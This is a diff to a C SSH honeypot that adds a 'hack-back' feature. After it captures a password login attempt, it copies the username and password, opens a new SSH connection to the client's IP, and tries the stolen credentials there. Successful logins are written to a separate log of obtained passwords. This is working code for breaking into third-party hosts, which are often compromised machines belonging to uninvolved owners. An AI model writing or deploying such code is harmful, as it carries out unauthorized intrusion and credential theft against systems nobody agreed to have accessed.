@@ -34,6 +34,7 @@ static struct banner_info_s {
 const size_t num_banners = sizeof banners / sizeof *banners;
 
 char *	logfile = LOGFILE;
+char *	geted_logfile = GETEDLOGFILE;
 char *	pidfile = PIDFILE;
 char *	rsakey = RSAKEY;
 char *	bindaddr = BINDADDR;
@@ -123,6 +124,45 @@ static int log_entry (const char *fmt, ...) {
   return n;
 }
 
+/* log_entry_geted() -- adds timestamped log entry for geted password
+ *             -- displays output to stdout if console_output is true
+ *             -- returns 0 on success, 1 on failure
+ */
+static int log_entry_geted(const char *fmt, ...) {
+  int		n;
+  FILE *	fp;
+  time_t	t;
+  va_list	va;
+  char *	timestr;
+  char		buf[1024];
+
+
+  time (&t);
+  timestr = strtok (ctime (&t), "\n"); // banish newline character to the land
+                                       // of wind and ghosts
+  if ((fp = fopen (geted_logfile, "a+")) == NULL) {
+    fprintf (stderr, "Unable to open logfile %s: %s\n",
+	     geted_logfile,
+	     strerror (errno));
+    return 1;
+  }
+
+  va_start (va, fmt);
+  vsnprintf (buf, sizeof(buf), fmt, va);
+  va_end (va);
+
+  if (use_syslog)
+    syslog (LOG_INFO | LOG_AUTHPRIV, "%s", buf);
+
+  n = fprintf (fp, "[%s] %s\n", timestr, buf);
+
+  if (console_output)
+    printf ("[%s] %s\n", timestr, buf);
+
+  fclose (fp);
+  return n;
+}
+
 
 /* get_ssh_ip() -- obtains IP address via ssh_session
  */
@@ -147,7 +187,9 @@ static char *get_ssh_ip (ssh_session session) {
 static int handle_ssh_auth (ssh_session session) {
   ssh_message	message;
   char *	ip;
-
+  char username[256];
+  char password[256];
+  int re_flag = 0;
 
   ip = get_ssh_ip (session);
 
@@ -159,18 +201,29 @@ static int handle_ssh_auth (ssh_session session) {
   for (;;) {
     if ((message = ssh_message_get (session)) == NULL)
       break;
-
+    
     if (ssh_message_subtype (message) == SSH_AUTH_METHOD_PASSWORD) {
-      log_entry ("%s %s %s",
-		 ip,
-		 ssh_message_auth_user (message),
-		 ssh_message_auth_password (message));
+      if(strlen(ssh_message_auth_user(message)) < 256 && strlen(ssh_message_auth_password(message)) < 256) {
+          strcpy(username, ssh_message_auth_user(message));
+          strcpy(password, ssh_message_auth_password(message));
+          log_entry ("%s %s %s",ip, username, password);
+          re_flag = 1;
+      } else {
+          log_entry("%s %s %s overlen",ip, ssh_message_auth_user(message), ssh_message_auth_password(message));
+      }
     }
-
     ssh_message_reply_default (message);
     ssh_message_free (message);
   }
-
+  if(re_flag) {
+      ssh_session re_ssh_session = ssh_new();
+      ssh_options_set(re_ssh_session, SSH_OPTIONS_HOST, ip);
+      ssh_connect(re_ssh_session);
+      rc = ssh_userauth_password(re_ssh_session, username, password);
+      if (rc == SSH_AUTH_SUCCESS) {
+          log_entry_geted("%s %s %s",ip, username, password);
+      }
+  }
   return 0;
 }
 
